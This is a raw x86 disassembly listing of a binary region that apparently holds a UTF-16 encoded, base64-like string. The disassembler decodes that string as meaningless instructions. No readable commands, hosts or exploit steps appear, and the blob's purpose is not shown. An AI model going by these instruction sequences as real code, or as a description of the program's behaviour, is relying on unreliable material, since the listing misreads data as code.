  40b437:	4f                   	dec    %edi
  40b438:	00 70 00             	add    %dh,0x0(%eax)
  40b43b:	49                   	dec    %ecx
  40b43c:	00 61 00             	add    %ah,0x0(%ecx)
  40b43f:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  40b443:	59                   	pop    %ecx
  40b444:	00 70 00             	add    %dh,0x0(%eax)
  40b447:	56                   	push   %esi
  40b448:	00 43 00             	add    %al,0x0(%ebx)
  40b44b:	4a                   	dec    %edx
  40b44c:	00 51 00             	add    %dl,0x0(%ecx)
  40b44f:	4a                   	dec    %edx
  40b450:	00 76 00             	add    %dh,0x0(%esi)
  40b453:	52                   	push   %edx
  40b454:	00 7a 00             	add    %bh,0x0(%edx)
  40b457:	53                   	push   %ebx
  40b458:	00 72 00             	add    %dh,0x0(%edx)
  40b45b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b45c:	00 4d 00             	add    %cl,0x0(%ebp)
  40b45f:	43                   	inc    %ebx
  40b460:	00 38                	add    %bh,(%eax)
  40b462:	00 57 00             	add    %dl,0x0(%edi)
  40b465:	4b                   	dec    %ebx
  40b466:	00 7a 00             	add    %bh,0x0(%edx)
  40b469:	2f                   	das
  40b46a:	00 78 00             	add    %bh,0x0(%eax)
  40b46d:	31 00                	xor    %eax,(%eax)
  40b46f:	69 00 64 00 2b 00    	imul   $0x2b0064,(%eax),%eax
  40b475:	66 00 2f             	data16 add %ch,(%edi)
  40b478:	00 79 00             	add    %bh,0x0(%ecx)
  40b47b:	76 00                	jbe    0x40b47d
  40b47d:	30 00                	xor    %al,(%eax)
  40b47f:	44                   	inc    %esp
  40b480:	00 32                	add    %dh,(%edx)
  40b482:	00 48 00             	add    %cl,0x0(%eax)
  40b485:	34 00                	xor    $0x0,%al
  40b487:	6a 00                	push   $0x0
  40b489:	50                   	push   %eax
  40b48a:	00 2f                	add    %ch,(%edi)
  40b48c:	00 35 00 4b 00 6e    	add    %dh,0x6e004b00
  40b492:	00 6d 00             	add    %ch,0x0(%ebp)
  40b495:	79 00                	jns    0x40b497
  40b497:	50                   	push   %eax
  40b498:	00 57 00             	add    %dl,0x0(%edi)
  40b49b:	78 00                	js     0x40b49d
  40b49d:	51                   	push   %ecx
  40b49e:	00 37                	add    %dh,(%edi)
  40b4a0:	00 6a 00             	add    %ch,0x0(%edx)
  40b4a3:	5a                   	pop    %edx
  40b4a4:	00 62 00             	add    %ah,0x0(%edx)
  40b4a7:	75 00                	jne    0x40b4a9
  40b4a9:	79 00                	jns    0x40b4ab
  40b4ab:	43                   	inc    %ebx
  40b4ac:	00 4c 00 36          	add    %cl,0x36(%eax,%eax,1)
  40b4b0:	00 45 00             	add    %al,0x0(%ebp)
  40b4b3:	6a 00                	push   $0x0
  40b4b5:	36 00 6b 00          	add    %ch,%ss:0x0(%ebx)
  40b4b9:	76 00                	jbe    0x40b4bb
  40b4bb:	61                   	popa
  40b4bc:	00 4b 00             	add    %cl,0x0(%ebx)
  40b4bf:	79 00                	jns    0x40b4c1
  40b4c1:	68 00 49 00 69       	push   $0x69004900
  40b4c6:	00 43 00             	add    %al,0x0(%ebx)
  40b4c9:	5a                   	pop    %edx
  40b4ca:	00 73 00             	add    %dh,0x0(%ebx)
  40b4cd:	2b 00                	sub    (%eax),%eax
  40b4cf:	6b 00 79             	imul   $0x79,(%eax),%eax
  40b4d2:	00 73 00             	add    %dh,0x0(%ebx)
  40b4d5:	43                   	inc    %ebx
  40b4d6:	00 69 00             	add    %ch,0x0(%ecx)
  40b4d9:	39 00                	cmp    %eax,(%eax)
  40b4db:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40b4df:	54                   	push   %esp
  40b4e0:	00 61 00             	add    %ah,0x0(%ecx)
  40b4e3:	75 00                	jne    0x40b4e5
  40b4e5:	73 00                	jae    0x40b4e7
  40b4e7:	42                   	inc    %edx
  40b4e8:	00 70 00             	add    %dh,0x0(%eax)
  40b4eb:	36 00 4d 00          	add    %cl,%ss:0x0(%ebp)
  40b4ef:	35 00 37 00 72       	xor    $0x72003700,%eax
  40b4f4:	00 2f                	add    %ch,(%edi)
  40b4f6:	00 36                	add    %dh,(%esi)
  40b4f8:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4fb:	70 00                	jo     0x40b4fd
  40b4fd:	68 00 74 00 73       	push   $0x73007400
  40b502:	00 71 00             	add    %dh,0x0(%ecx)
  40b505:	73 00                	jae    0x40b507
  40b507:	55                   	push   %ebp
  40b508:	00 65 00             	add    %ah,0x0(%ebp)
  40b50b:	45                   	inc    %ebp
  40b50c:	00 4c 00 78          	add    %cl,0x78(%eax,%eax,1)
  40b510:	00 37                	add    %dh,(%edi)
  40b512:	00 52 00             	add    %dl,0x0(%edx)
  40b515:	56                   	push   %esi
  40b516:	00 45 00             	add    %al,0x0(%ebp)
  40b519:	49                   	dec    %ecx
  40b51a:	00 6f 00             	add    %ch,0x0(%edi)
  40b51d:	52                   	push   %edx
  40b51e:	00 57 00             	add    %dl,0x0(%edi)
  40b521:	46                   	inc    %esi
  40b522:	00 32                	add    %dh,(%edx)
  40b524:	00 52 00             	add    %dl,0x0(%edx)
  40b527:	6c                   	insb   (%dx),%es:(%edi)
  40b528:	00 4f 00             	add    %cl,0x0(%edi)
  40b52b:	4c                   	dec    %esp
  40b52c:	00 41 00             	add    %al,0x0(%ecx)
  40b52f:	41                   	inc    %ecx
  40b530:	00 32                	add    %dh,(%edx)
  40b532:	00 30                	add    %dh,(%eax)
  40b534:	00 30                	add    %dh,(%eax)
  40b536:	00 49 00             	add    %cl,0x0(%ecx)
  40b539:	51                   	push   %ecx
  40b53a:	00 6a 00             	add    %ch,0x0(%edx)
  40b53d:	7a 00                	jp     0x40b53f
  40b53f:	41                   	inc    %ecx
  40b540:	00 4f 00             	add    %cl,0x0(%edi)
  40b543:	61                   	popa
  40b544:	00 2f                	add    %ch,(%edi)
  40b546:	00 79 00             	add    %bh,0x0(%ecx)
  40b549:	58                   	pop    %eax
  40b54a:	00 6d 00             	add    %ch,0x0(%ebp)
  40b54d:	42                   	inc    %edx
  40b54e:	00 54 00 75          	add    %dl,0x75(%eax,%eax,1)
  40b552:	00 65 00             	add    %ah,0x0(%ebp)
  40b555:	51                   	push   %ecx
  40b556:	00 33                	add    %dh,(%ebx)
  40b558:	00 36                	add    %dh,(%esi)
  40b55a:	00 4a 00             	add    %cl,0x0(%edx)
  40b55d:	5a                   	pop    %edx
  40b55e:	00 37                	add    %dh,(%edi)
  40b560:	00 7a 00             	add    %bh,0x0(%edx)
  40b563:	53                   	push   %ebx
  40b564:	00 72 00             	add    %dh,0x0(%edx)
  40b567:	72 00                	jb     0x40b569
  40b569:	67 00 49 00          	add    %cl,0x0(%bx,%di)
  40b56d:	33 00                	xor    (%eax),%eax
  40b56f:	31 00                	xor    %eax,(%eax)
  40b571:	54                   	push   %esp
  40b572:	00 65 00             	add    %ah,0x0(%ebp)
  40b575:	35 00 51 00 73       	xor    $0x73005100,%eax
  40b57a:	00 62 00             	add    %ah,0x0(%edx)
  40b57d:	4c                   	dec    %esp
  40b57e:	00 66 00             	add    %ah,0x0(%esi)
  40b581:	45                   	inc    %ebp
  40b582:	00 45 00             	add    %al,0x0(%ebp)
  40b585:	7a 00                	jp     0x40b587
  40b587:	33 00                	xor    (%eax),%eax
  40b589:	6d                   	insl   (%dx),%es:(%edi)
  40b58a:	00 57 00             	add    %dl,0x0(%edi)
  40b58d:	4a                   	dec    %edx
  40b58e:	00 37                	add    %dh,(%edi)
  40b590:	00 77 00             	add    %dh,0x0(%edi)
  40b593:	37                   	aaa
  40b594:	00 66 00             	add    %ah,0x0(%esi)
  40b597:	57                   	push   %edi
  40b598:	00 4f 00             	add    %cl,0x0(%edi)
  40b59b:	4f                   	dec    %edi
  40b59c:	00 36                	add    %dh,(%esi)
  40b59e:	00 6d 00             	add    %ch,0x0(%ebp)
  40b5a1:	57                   	push   %edi
  40b5a2:	00 73 00             	add    %dh,0x0(%ebx)
  40b5a5:	37                   	aaa
  40b5a6:	00 48 00             	add    %cl,0x0(%eax)
  40b5a9:	2b 00                	sub    (%eax),%eax
  40b5ab:	78 00                	js     0x40b5ad
  40b5ad:	45                   	inc    %ebp
  40b5ae:	00 6d 00             	add    %ch,0x0(%ebp)
  40b5b1:	34 00                	xor    $0x0,%al
  40b5b3:	69 00 32 00 71 00    	imul   $0x710032,(%eax),%eax
  40b5b9:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5ba:	00 76 00             	add    %dh,0x0(%esi)
  40b5bd:	77 00                	ja     0x40b5bf
  40b5bf:	77 00                	ja     0x40b5c1
  40b5c1:	75 00                	jne    0x40b5c3
  40b5c3:	47                   	inc    %edi
  40b5c4:	00 44 00 76          	add    %al,0x76(%eax,%eax,1)
  40b5c8:	00 6c 00 56          	add    %ch,0x56(%eax,%eax,1)
  40b5cc:	00 62 00             	add    %ah,0x0(%edx)
  40b5cf:	41                   	inc    %ecx
  40b5d0:	00 69 00             	add    %ch,0x0(%ecx)
  40b5d3:	69 00 46 00 4e 00    	imul   $0x4e0046,(%eax),%eax
  40b5d9:	71 00                	jno    0x40b5db
  40b5db:	36 00 33             	add    %dh,%ss:(%ebx)
  40b5de:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
  40b5e2:	00 61 00             	add    %ah,0x0(%ecx)
  40b5e5:	32 00                	xor    (%eax),%al
  40b5e7:	4a                   	dec    %edx
  40b5e8:	00 44 00 50          	add    %al,0x50(%eax,%eax,1)
  40b5ec:	00 4d 00             	add    %cl,0x0(%ebp)
  40b5ef:	63 00                	arpl   %eax,(%eax)
  40b5f1:	50                   	push   %eax
  40b5f2:	00 66 00             	add    %ah,0x0(%esi)
  40b5f5:	77 00                	ja     0x40b5f7
  40b5f7:	2b 00                	sub    (%eax),%eax
  40b5f9:	44                   	inc    %esp
  40b5fa:	00 63 00             	add    %ah,0x0(%ebx)
  40b5fd:	69 00 50 00 6c 00    	imul   $0x6c0050,(%eax),%eax
  40b603:	32 00                	xor    (%eax),%al
  40b605:	31 00                	xor    %eax,(%eax)
  40b607:	71 00                	jno    0x40b609
  40b609:	48                   	dec    %eax
  40b60a:	00 59 00             	add    %bl,0x0(%ecx)
  40b60d:	57                   	push   %edi
  40b60e:	00 62 00             	add    %ah,0x0(%edx)
  40b611:	59                   	pop    %ecx
  40b612:	00 62 00             	add    %ah,0x0(%edx)
  40b615:	68 00 6d 00 4d       	push   $0x4d006d00
  40b61a:	00 53 00             	add    %dl,0x0(%ebx)
  40b61d:	42                   	inc    %edx
  40b61e:	00 48 00             	add    %cl,0x0(%eax)
  40b621:	72 00                	jb     0x40b623
  40b623:	58                   	pop    %eax
  40b624:	00 6d 00             	add    %ch,0x0(%ebp)
  40b627:	5a                   	pop    %edx
  40b628:	00 63 00             	add    %ah,0x0(%ebx)
  40b62b:	54                   	push   %esp
  40b62c:	00 2f                	add    %ch,(%edi)
  40b62e:	00 58 00             	add    %bl,0x0(%eax)
  40b631:	43                   	inc    %ebx
  40b632:	00 55 00             	add    %dl,0x0(%ebp)
  40b635:	53                   	push   %ebx
  40b636:	00 6f 00             	add    %ch,0x0(%edi)
  40b639:	39 00                	cmp    %eax,(%eax)
  40b63b:	65 00 43 00          	add    %al,%gs:0x0(%ebx)
  40b63f:	62 00                	bound  %eax,(%eax)
  40b641:	33 00                	xor    (%eax),%eax
  40b643:	41                   	inc    %ecx
  40b644:	00 58 00             	add    %bl,0x0(%eax)
  40b647:	58                   	pop    %eax
  40b648:	00 74 00 35          	add    %dh,0x35(%eax,%eax,1)
  40b64c:	00 4f 00             	add    %cl,0x0(%edi)
  40b64f:	36 00 71 00          	add    %dh,%ss:0x0(%ecx)
  40b653:	61                   	popa
  40b654:	00 44 00 37          	add    %al,0x37(%eax,%eax,1)
  40b658:	00 2f                	add    %ch,(%edi)
  40b65a:	00 6f 00             	add    %ch,0x0(%edi)
  40b65d:	77 00                	ja     0x40b65f
  40b65f:	30 00                	xor    %al,(%eax)
  40b661:	76 00                	jbe    0x40b663
  40b663:	42                   	inc    %edx
  40b664:	00 37                	add    %dh,(%edi)
  40b666:	00 30                	add    %dh,(%eax)
  40b668:	00 58 00             	add    %bl,0x0(%eax)
  40b66b:	4d                   	dec    %ebp
  40b66c:	00 6d 00             	add    %ch,0x0(%ebp)
  40b66f:	43                   	inc    %ebx
  40b670:	00 43 00             	add    %al,0x0(%ebx)
  40b673:	5a                   	pop    %edx
  40b674:	00 4d 00             	add    %cl,0x0(%ebp)
  40b677:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  40b67b:	68 00 55 00 51       	push   $0x51005500
  40b680:	00 6f 00             	add    %ch,0x0(%edi)
  40b683:	4a                   	dec    %edx
  40b684:	00 46 00             	add    %al,0x0(%esi)
  40b687:	59                   	pop    %ecx
  40b688:	00 37                	add    %dh,(%edi)
  40b68a:	00 41 00             	add    %al,0x0(%ecx)
  40b68d:	6a 00                	push   $0x0
  40b68f:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40b693:	66 00 54 00 4a       	data16 add %dl,0x4a(%eax,%eax,1)
  40b698:	00 52 00             	add    %dl,0x0(%edx)
  40b69b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b69c:	00 7a 00             	add    %bh,0x0(%edx)
  40b69f:	4f                   	dec    %edi
  40b6a0:	00 4a 00             	add    %cl,0x0(%edx)
  40b6a3:	49                   	dec    %ecx
  40b6a4:	00 4e 00             	add    %cl,0x0(%esi)
  40b6a7:	71 00                	jno    0x40b6a9
  40b6a9:	6a 00                	push   $0x0
  40b6ab:	79 00                	jns    0x40b6ad
  40b6ad:	45                   	inc    %ebp
  40b6ae:	00 58 00             	add    %bl,0x0(%eax)
  40b6b1:	53                   	push   %ebx
  40b6b2:	00 37                	add    %dh,(%edi)
  40b6b4:	00 46 00             	add    %al,0x0(%esi)
  40b6b7:	4f                   	dec    %edi
  40b6b8:	00 41 00             	add    %al,0x0(%ecx)
  40b6bb:	42                   	inc    %edx
  40b6bc:	00 47 00             	add    %al,0x0(%edi)
  40b6bf:	67 00 49 00          	add    %cl,0x0(%bx,%di)
  40b6c3:	46                   	inc    %esi
  40b6c4:	00 71 00             	add    %dh,0x0(%ecx)
  40b6c7:	67 00 34             	add    %dh,(%si)
  40b6ca:	00 4c 00 2b          	add    %cl,0x2b(%eax,%eax,1)
  40b6ce:	00 51 00             	add    %dl,0x0(%ecx)
  40b6d1:	2b 00                	sub    (%eax),%eax
  40b6d3:	34 00                	xor    $0x0,%al
  40b6d5:	68 00 77 00 4b       	push   $0x4b007700
  40b6da:	00 6b 00             	add    %ch,0x0(%ebx)
  40b6dd:	2f                   	das
  40b6de:	00 6b 00             	add    %ch,0x0(%ebx)
  40b6e1:	4e                   	dec    %esi
  40b6e2:	00 51 00             	add    %dl,0x0(%ecx)
  40b6e5:	50                   	push   %eax
  40b6e6:	00 31                	add    %dh,(%ecx)
  40b6e8:	00 4b 00             	add    %cl,0x0(%ebx)
  40b6eb:	77 00                	ja     0x40b6ed
  40b6ed:	59                   	pop    %ecx
  40b6ee:	00 6c 00 41          	add    %ch,0x41(%eax,%eax,1)
  40b6f2:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
  40b6f6:	00 57 00             	add    %dl,0x0(%edi)
  40b6f9:	4a                   	dec    %edx
  40b6fa:	00 5a 00             	add    %bl,0x0(%edx)
  40b6fd:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40b701:	75 00                	jne    0x40b703
  40b703:	2f                   	das
  40b704:	00 58 00             	add    %bl,0x0(%eax)
  40b707:	42                   	inc    %edx
  40b708:	00 52 00             	add    %dl,0x0(%edx)
  40b70b:	52                   	push   %edx
  40b70c:	00 4a 00             	add    %cl,0x0(%edx)
  40b70f:	55                   	push   %ebp
  40b710:	00 73 00             	add    %dh,0x0(%ebx)
  40b713:	36 00 35 00 44 00 33 	add    %dh,%ss:0x33004400
  40b71a:	00 56 00             	add    %dl,0x0(%esi)
  40b71d:	51                   	push   %ecx
  40b71e:	00 63 00             	add    %ah,0x0(%ebx)
  40b721:	67 00 54 00          	add    %dl,0x0(%si)
  40b725:	50                   	push   %eax
  40b726:	00 2f                	add    %ch,(%edi)
  40b728:	00 4b 00             	add    %cl,0x0(%ebx)
  40b72b:	73 00                	jae    0x40b72d
  40b72d:	47                   	inc    %edi
  40b72e:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  40b732:	00 6c 00 34          	add    %ch,0x34(%eax,%eax,1)
  40b736:	00 4c 00 71          	add    %cl,0x71(%eax,%eax,1)
  40b73a:	00 56 00             	add    %dl,0x0(%esi)
  40b73d:	62 00                	bound  %eax,(%eax)
  40b73f:	74 00                	je     0x40b741
  40b741:	37                   	aaa
  40b742:	00 77 00             	add    %dh,0x0(%edi)
  40b745:	30 00                	xor    %al,(%eax)
  40b747:	77 00                	ja     0x40b749
  40b749:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  40b74d:	35 00 77 00 38       	xor    $0x38007700,%eax
  40b752:	00 48 00             	add    %cl,0x0(%eax)
  40b755:	77 00                	ja     0x40b757
  40b757:	4e                   	dec    %esi
  40b758:	00 6a 00             	add    %ch,0x0(%edx)
  40b75b:	43                   	inc    %ebx
  40b75c:	00 61 00             	add    %ah,0x0(%ecx)
  40b75f:	58                   	pop    %eax
  40b760:	00 69 00             	add    %ch,0x0(%ecx)
  40b763:	35 00 70 00 78       	xor    $0x78007000,%eax
  40b768:	00 64 00 59          	add    %ah,0x59(%eax,%eax,1)
  40b76c:	00 58 00             	add    %bl,0x0(%eax)
  40b76f:	52                   	push   %edx
  40b770:	00 42 00             	add    %al,0x0(%edx)
  40b773:	2b 00                	sub    (%eax),%eax
  40b775:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  40b779:	5a                   	pop    %edx
  40b77a:	00 65 00             	add    %ah,0x0(%ebp)
  40b77d:	69 00 78 00 59 00    	imul   $0x590078,(%eax),%eax
  40b783:	45                   	inc    %ebp
  40b784:	00 47 00             	add    %al,0x0(%edi)
  40b787:	69 00 50 00 68 00    	imul   $0x680050,(%eax),%eax
  40b78d:	79 00                	jns    0x40b78f
  40b78f:	32 00                	xor    (%eax),%al
  40b791:	73 00                	jae    0x40b793
  40b793:	53                   	push   %ebx
  40b794:	00 2b                	add    %ch,(%ebx)
  40b796:	00 75 00             	add    %dh,0x0(%ebp)
  40b799:	41                   	inc    %ecx
  40b79a:	00 6d 00             	add    %ch,0x0(%ebp)
  40b79d:	41                   	inc    %ecx
  40b79e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b7a1:	41                   	inc    %ecx
  40b7a2:	00 55 00             	add    %dl,0x0(%ebp)
  40b7a5:	4a                   	dec    %edx
  40b7a6:	00 32                	add    %dh,(%edx)
  40b7a8:	00 73 00             	add    %dh,0x0(%ebx)
  40b7ab:	2f                   	das
  40b7ac:	00 66 00             	add    %ah,0x0(%esi)
  40b7af:	77 00                	ja     0x40b7b1
  40b7b1:	32 00                	xor    (%eax),%al
  40b7b3:	61                   	popa
  40b7b4:	00 46 00             	add    %al,0x0(%esi)
  40b7b7:	53                   	push   %ebx
  40b7b8:	00 4c 00 66          	add    %cl,0x66(%eax,%eax,1)
  40b7bc:	00 47 00             	add    %al,0x0(%edi)
  40b7bf:	74 00                	je     0x40b7c1
  40b7c1:	62 00                	bound  %eax,(%eax)
  40b7c3:	31 00                	xor    %eax,(%eax)
  40b7c5:	59                   	pop    %ecx
  40b7c6:	00 42 00             	add    %al,0x0(%edx)
  40b7c9:	65 00 64 00 61       	add    %ah,%gs:0x61(%eax,%eax,1)
  40b7ce:	00 61 00             	add    %ah,0x0(%ecx)
  40b7d1:	6a 00                	push   $0x0
  40b7d3:	46                   	inc    %esi
  40b7d4:	00 55 00             	add    %dl,0x0(%ebp)
  40b7d7:	63 00                	arpl   %eax,(%eax)
  40b7d9:	67 00 50 00          	add    %dl,0x0(%bx,%si)
  40b7dd:	58                   	pop    %eax
  40b7de:	00 77 00             	add    %dh,0x0(%edi)
  40b7e1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7e2:	00 59 00             	add    %bl,0x0(%ecx)
  40b7e5:	6d                   	insl   (%dx),%es:(%edi)
  40b7e6:	00 61 00             	add    %ah,0x0(%ecx)
  40b7e9:	72 00                	jb     0x40b7eb
  40b7eb:	77 00                	ja     0x40b7ed
  40b7ed:	41                   	inc    %ecx
  40b7ee:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
  40b7f2:	00 2f                	add    %ch,(%edi)
  40b7f4:	00 2b                	add    %ch,(%ebx)
  40b7f6:	00 73 00             	add    %dh,0x0(%ebx)
  40b7f9:	52                   	push   %edx
  40b7fa:	00 63 00             	add    %ah,0x0(%ebx)
  40b7fd:	51                   	push   %ecx
  40b7fe:	00 49 00             	add    %cl,0x0(%ecx)
  40b801:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40b805:	62 00                	bound  %eax,(%eax)
  40b807:	71 00                	jno    0x40b809
  40b809:	52                   	push   %edx
  40b80a:	00 77 00             	add    %dh,0x0(%edi)
  40b80d:	2f                   	das
  40b80e:	00 4e 00             	add    %cl,0x0(%esi)
  40b811:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  40b815:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  40b819:	79 00                	jns    0x40b81b
  40b81b:	42                   	inc    %edx
  40b81c:	00 4e 00             	add    %cl,0x0(%esi)
  40b81f:	34 00                	xor    $0x0,%al
  40b821:	57                   	push   %edi
  40b822:	00 38                	add    %bh,(%eax)
  40b824:	00 4c 00 70          	add    %cl,0x70(%eax,%eax,1)
  40b828:	00 2f                	add    %ch,(%edi)
  40b82a:	00 4b 00             	add    %cl,0x0(%ebx)
  40b82d:	76 00                	jbe    0x40b82f
  40b82f:	74 00                	je     0x40b831
  40b831:	2b 00                	sub    (%eax),%eax
  40b833:	4d                   	dec    %ebp
  40b834:	00 71 00             	add    %dh,0x0(%ecx)
  40b837:	6a 00                	push   $0x0
  40b839:	78 00                	js     0x40b83b
  40b83b:	48                   	dec    %eax
  40b83c:	00 41 00             	add    %al,0x0(%ecx)
  40b83f:	7a 00                	jp     0x40b841
  40b841:	74 00                	je     0x40b843
  40b843:	5a                   	pop    %edx
  40b844:	00 52 00             	add    %dl,0x0(%edx)
  40b847:	52                   	push   %edx
  40b848:	00 66 00             	add    %ah,0x0(%esi)
  40b84b:	57                   	push   %edi
  40b84c:	00 56 00             	add    %dl,0x0(%esi)
  40b84f:	48                   	dec    %eax
  40b850:	00 32                	add    %dh,(%edx)
  40b852:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  40b856:	00 6e 00             	add    %ch,0x0(%esi)
  40b859:	51                   	push   %ecx
  40b85a:	00 39                	add    %bh,(%ecx)
  40b85c:	00 7a 00             	add    %bh,0x0(%edx)
  40b85f:	71 00                	jno    0x40b861
  40b861:	4d                   	dec    %ebp
  40b862:	00 65 00             	add    %ah,0x0(%ebp)
  40b865:	2f                   	das
  40b866:	00 59 00             	add    %bl,0x0(%ecx)
  40b869:	4d                   	dec    %ebp
  40b86a:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  40b86e:	00 50 00             	add    %dl,0x0(%eax)
  40b871:	4a                   	dec    %edx
  40b872:	00 6f 00             	add    %ch,0x0(%edi)
  40b875:	34 00                	xor    $0x0,%al
  40b877:	35 00 4c 00 4d       	xor    $0x4d004c00,%eax
  40b87c:	00 65 00             	add    %ah,0x0(%ebp)
  40b87f:	6d                   	insl   (%dx),%es:(%edi)
  40b880:	00 6f 00             	add    %ch,0x0(%edi)
  40b883:	4f                   	dec    %edi
  40b884:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b887:	33 00                	xor    (%eax),%eax
  40b889:	4c                   	dec    %esp
  40b88a:	00 78 00             	add    %bh,0x0(%eax)
  40b88d:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  40b891:	69 00 4c 00 4a 00    	imul   $0x4a004c,(%eax),%eax
  40b897:	45                   	inc    %ebp
  40b898:	00 55 00             	add    %dl,0x0(%ebp)
  40b89b:	79 00                	jns    0x40b89d
  40b89d:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  40b8a0:	00 36                	add    %dh,(%esi)
  40b8a2:	00 6d 00             	add    %ch,0x0(%ebp)
  40b8a5:	46                   	inc    %esi
  40b8a6:	00 33                	add    %dh,(%ebx)
  40b8a8:	00 4f 00             	add    %cl,0x0(%edi)
  40b8ab:	56                   	push   %esi
  40b8ac:	00 42 00             	add    %al,0x0(%edx)
  40b8af:	2f                   	das
  40b8b0:	00 58 00             	add    %bl,0x0(%eax)
  40b8b3:	2b 00                	sub    (%eax),%eax
  40b8b5:	51                   	push   %ecx
  40b8b6:	00 36                	add    %dh,(%esi)
  40b8b8:	00 2b                	add    %ch,(%ebx)
  40b8ba:	00 4d 00             	add    %cl,0x0(%ebp)
  40b8bd:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8be:	00 7a 00             	add    %bh,0x0(%edx)
  40b8c1:	42                   	inc    %edx
  40b8c2:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  40b8c6:	00 32                	add    %dh,(%edx)
  40b8c8:	00 53 00             	add    %dl,0x0(%ebx)
  40b8cb:	4b                   	dec    %ebx
  40b8cc:	00 61 00             	add    %ah,0x0(%ecx)
  40b8cf:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8d0:	00 4b 00             	add    %cl,0x0(%ebx)
  40b8d3:	56                   	push   %esi
  40b8d4:	00 43 00             	add    %al,0x0(%ebx)
  40b8d7:	54                   	push   %esp
  40b8d8:	00 45 00             	add    %al,0x0(%ebp)
  40b8db:	72 00                	jb     0x40b8dd
  40b8dd:	2b 00                	sub    (%eax),%eax
  40b8df:	4c                   	dec    %esp
  40b8e0:	00 36                	add    %dh,(%esi)
  40b8e2:	00 4e 00             	add    %cl,0x0(%esi)
  40b8e5:	42                   	inc    %edx
  40b8e6:	00 71 00             	add    %dh,0x0(%ecx)
  40b8e9:	74 00                	je     0x40b8eb
  40b8eb:	41                   	inc    %ecx
  40b8ec:	00 61 00             	add    %ah,0x0(%ecx)
  40b8ef:	63 00                	arpl   %eax,(%eax)
  40b8f1:	39 00                	cmp    %eax,(%eax)
  40b8f3:	52                   	push   %edx
  40b8f4:	00 71 00             	add    %dh,0x0(%ecx)
  40b8f7:	77 00                	ja     0x40b8f9
  40b8f9:	43                   	inc    %ebx
  40b8fa:	00 6a 00             	add    %ch,0x0(%edx)
  40b8fd:	69 00 79 00 46 00    	imul   $0x460079,(%eax),%eax
  40b903:	42                   	inc    %edx
  40b904:	00 69 00             	add    %ch,0x0(%ecx)
  40b907:	32 00                	xor    (%eax),%al
  40b909:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  40b90d:	55                   	push   %ebp
  40b90e:	00 46 00             	add    %al,0x0(%esi)
  40b911:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  40b915:	7a 00                	jp     0x40b917
  40b917:	32 00                	xor    (%eax),%al
  40b919:	75 00                	jne    0x40b91b
  40b91b:	48                   	dec    %eax
  40b91c:	00 44 00 7a          	add    %al,0x7a(%eax,%eax,1)
  40b920:	00 6a 00             	add    %ch,0x0(%edx)
  40b923:	44                   	inc    %esp
  40b924:	00 6b 00             	add    %ch,0x0(%ebx)
  40b927:	33 00                	xor    (%eax),%eax
  40b929:	59                   	pop    %ecx
  40b92a:	00 5a 00             	add    %bl,0x0(%edx)
  40b92d:	75 00                	jne    0x40b92f
  40b92f:	51                   	push   %ecx
  40b930:	00 61 00             	add    %ah,0x0(%ecx)
  40b933:	71 00                	jno    0x40b935
  40b935:	41                   	inc    %ecx
  40b936:	00 7a 00             	add    %bh,0x0(%edx)
  40b939:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40b93d:	47                   	inc    %edi
  40b93e:	00 50 00             	add    %dl,0x0(%eax)
  40b941:	71 00                	jno    0x40b943
  40b943:	6c                   	insb   (%dx),%es:(%edi)
  40b944:	00 79 00             	add    %bh,0x0(%ecx)
  40b947:	59                   	pop    %ecx
  40b948:	00 43 00             	add    %al,0x0(%ebx)
  40b94b:	38 00                	cmp    %al,(%eax)
  40b94d:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40b950:	00 6f 00             	add    %ch,0x0(%edi)
  40b953:	37                   	aaa
  40b954:	00 4b 00             	add    %cl,0x0(%ebx)
  40b957:	46                   	inc    %esi
  40b958:	00 49 00             	add    %cl,0x0(%ecx)
  40b95b:	75 00                	jne    0x40b95d
  40b95d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b95e:	00 41 00             	add    %al,0x0(%ecx)
  40b961:	48                   	dec    %eax
  40b962:	00 45 00             	add    %al,0x0(%ebp)
  40b965:	56                   	push   %esi
  40b966:	00 74 00 67          	add    %dh,0x67(%eax,%eax,1)
  40b96a:	00 2f                	add    %ch,(%edi)
  40b96c:	00 59 00             	add    %bl,0x0(%ecx)
  40b96f:	4c                   	dec    %esp
  40b970:	00 72 00             	add    %dh,0x0(%edx)
  40b973:	35 00 48 00 4a       	xor    $0x4a004800,%eax
  40b978:	00 74 00 4e          	add    %dh,0x4e(%eax,%eax,1)
  40b97c:	00 67 00             	add    %ah,0x0(%edi)
  40b97f:	4c                   	dec    %esp
  40b980:	00 5a 00             	add    %bl,0x0(%edx)
  40b983:	46                   	inc    %esi
  40b984:	00 61 00             	add    %ah,0x0(%ecx)
  40b987:	57                   	push   %edi
  40b988:	00 72 00             	add    %dh,0x0(%edx)
  40b98b:	5a                   	pop    %edx
  40b98c:	00 73 00             	add    %dh,0x0(%ebx)
  40b98f:	4d                   	dec    %ebp
